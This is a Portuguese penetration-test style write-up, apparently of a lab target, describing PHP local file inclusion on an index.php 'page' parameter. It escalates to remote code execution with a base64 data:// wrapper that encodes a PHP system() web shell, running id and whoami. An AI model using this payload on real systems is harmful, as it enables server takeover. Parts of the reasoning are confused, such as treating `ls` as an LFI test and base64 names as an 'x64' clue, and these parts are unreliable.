# 💉 No **OSINT** do site identificamos a possibilidade de existência de uma página com fraquezas de **injeção PHP**.  
Vamos detalhar a análise realizada: 💉💉💉

---

## 📌 Página em questão

<img width="1174" height="850" alt="image" src="https://github.com/user-attachments/assets/8e4eab61-e50f-4932-a89c-153d68a347c5" />

A página pode conter outros tipos de injeções, mas a vulnerabilidade encontrada foi no **parâmetro da URL**:

👉 Exemplo:  
```
http://rh.businesscorp.com.br/index.php?page=submit
```

---

## 💻 Possíveis Injeções LFI

O site pode ser suscetível a **Local File Inclusion (LFI)**.  
Para testar, basta inserir um comando simples como `ls` no final do parâmetro `page`:

👉 Exemplo:  
```
http://rh.businesscorp.com.br/?page=ls
```

<img width="1670" height="267" alt="image" src="https://github.com/user-attachments/assets/8d1545e8-3c03-4939-938a-efea531ff1c2" />

🔎 O **erro retornado** já revela informações importantes sobre o servidor:

```
Warning: include(): Failed opening 'ls.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') 
in /var/www/html/index.php on line 54
```

---

## 🧪 Testes Realizados

### Teste 2:
<img width="995" height="207" alt="image" src="https://github.com/user-attachments/assets/ddd1206a-14f5-4ec6-abfd-5a8ce98cd182" />

### Teste 3:
<img width="987" height="173" alt="image" src="https://github.com/user-attachments/assets/44b6b4d2-7e4d-41cb-b10c-b6898e0d6810" />

Com base nos comandos e erros retornados, foi possível **ajustar a exploração da vulnerabilidade**.

---

## 🔑 Credenciais Encontradas

Durante as análises, com base em uma lista que criei a partir da vulnerabilidade da porta 22, observei indícios de credenciais em **Base64**:

- root → `cm9vdA==`  
- ftp → `ZnRw`  

Isso sugere que o LFI pode estar relacionado a um **sistema x64**, abrindo espaço para **testes de injection em Base64**.

---

## ⚙️ Exploração com Data Wrapper (RCE)

Pesquisando sobre possíveis **RCEs (Remote Code Execution)**, encontrei que é possível usar `data://text/plain;base64` para injetar comandos.

### ▶️ Executando `id`
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```

<img width="1461" height="193" alt="image" src="https://github.com/user-attachments/assets/ba17d026-9e13-45e5-ac4c-1ac20da10a77" />

⚠️ A resposta não aparece diretamente no site, mas analisando via **F12 (DevTools)**, conseguimos verificar que o comando foi processado corretamente.

---

### ▶️ Executando `whoami`
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami
```

<img width="1096" height="194" alt="image" src="https://github.com/user-attachments/assets/c9d29a71-2c0a-489a-a182-f5e6d63bf92a" />

---

# 📖 Conclusão

✔️ O site apresenta vulnerabilidades de **LFI** que podem evoluir para **RCE** utilizando técnicas de **Base64 Data Wrapper**.  
✔️ Foram identificadas credenciais em **Base64**, sugerindo possível exploração de acesso.  
✔️ Apesar de não exibir diretamente no navegador, os comandos executados podem ser verificados no **código-fonte via DevTools**.

⚡ Essa análise confirma o risco de exposição crítica do sistema.

---
✍️ Relatório finalizado com base em testes realizados manualmente.
